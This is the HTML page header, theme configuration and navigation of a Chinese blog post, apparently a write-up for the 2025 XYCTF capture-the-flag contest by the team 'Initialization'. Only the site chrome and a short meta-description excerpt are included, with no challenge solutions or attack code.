<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="collectcrop">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="一、战队信息 战队名称：Initialization 战队排名：12 二、解题情况  三、解题过程 web-Signin 直接看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File">
<meta property="og:type" content="article">
<meta property="og:title" content="2025xyctf wp">
<meta property="og:url" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/index.html">
<meta property="og:site_name" content="Collectcrop&#39;s Blog">
<meta property="og:description" content="一、战队信息 战队名称：Initialization 战队排名：12 二、解题情况  三、解题过程 web-Signin 直接看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406222023429.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406211100373.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406211838986.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406213100890.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406213109708.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406213133619.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406210259268.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406210421004.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406210508212.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250405234435982.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250405234624315.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250405235559760.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406201519395.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/QQ%E5%9B%BE%E7%89%8720250406204757.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406205012191.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/QQ%E5%9B%BE%E7%89%8720250406205318.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406230240750.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406230902822.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406231331209.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406130641781.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406131116881.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406132515219.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406132529260.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406215924045.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406133932926.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406134028629.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406134238918.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406220110891.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406220227334.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406135806428.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406135826050.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406135852679.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406135907187.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406140114087.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406140204662.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406140338256.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406140433554.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406140852376.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406220530194.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406125856838.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406121830285.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406125556426.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406125348724.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406220809627.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406120325178.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406121530077.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406220953049.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406115158364.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406115248326.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406115350378.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406115803805.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406221210064.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406113623083.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406114429666.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406114152173.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406114651337.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406114501059.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406221634476.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406222411496.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406223841395.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406224031766.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406224346310.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406224605129.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-222151-1744002931594-1.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-115925-1744002931594-3.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223944-1744002931594-2.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-134853-1744002931594-4.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250407094553817.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250407095010649.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250407095222970.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-222926.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223032-1744002931594-5.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250407095832084.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223137-1744002931594-6.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406231907423.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406232133685.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406224335690.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250407132018172.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406213220996-1743954120807-90.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406213409260-1743954120807-91.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406213551415-1743954120807-92.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406213723500-1743954120807-93.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406213855060-1743954120807-94.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406214059696-1743954120807-95.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406214143202-1743954120807-96.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406214224910-1743954120807-97.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406214613601-1743954120807-98.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406214459712-1743953865918-1743954120807-99.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406214519061-1743954120807-100.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406215452620-1743953974505-76.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406215430650-1743953974505-77.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406215621978-1743953974505-78.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406215952102-1743953974505-79.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406220311579-1743953974505-80.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406220726360-1743953974506-81.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/xyctf2025wp/image-20250406220901136-1743953974506-82.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406233620326.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211623.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211633.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-211742.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212051.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212100.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212153.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212838.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-212850.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-220144.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-220308.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213510.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213557.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213852.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213948.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-213953.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-214337.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-214419.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-215124.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-215158.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-221013.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153311.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153259.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153137.png">
<meta property="article:published_time" content="2025-04-08T03:26:17.000Z">
<meta property="article:modified_time" content="2025-05-26T12:30:22.202Z">
<meta property="article:author" content="collectcrop">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://collectcrop.github.io/blog/2025/04/08/2025xyctf-wp/image-20250406222023429.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/blog/images/redefine-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/redefine-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/blog/images/redefine-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            2025xyctf wp | Collectcrop&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/blog/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/blog/css/style.css">


    
        
<link rel="stylesheet" href="/blog/build/css/tailwind.css">

    

    
<link rel="stylesheet" href="/blog/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/blog/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    
        
<script src="/blog/build/js/libs/anime.min.js"></script>

    

    <script id="hexo-configurations">
    window.config = {"hostname":"collectcrop.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Collectcrop's Blog","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/collectcrop","instagram":null,"zhihu":null,"twitter":null,"email":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=2583727188&site=qq&menu=yes"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"path":"/categories/","icon":"fa-solid fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Just enjoy.","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/23 15:52:11"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/blog/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/blog/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/blog/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/blog/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    <h2 class="ml13">
        Collectcrop&#39;s Blog
    </h2>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }
    </script>
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/blog/">
                
                Collectcrop&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/blog/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/blog/links">
                                                    友情链接
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/archives"
                        >
                            <span>
                                归档
                            </span>
                            
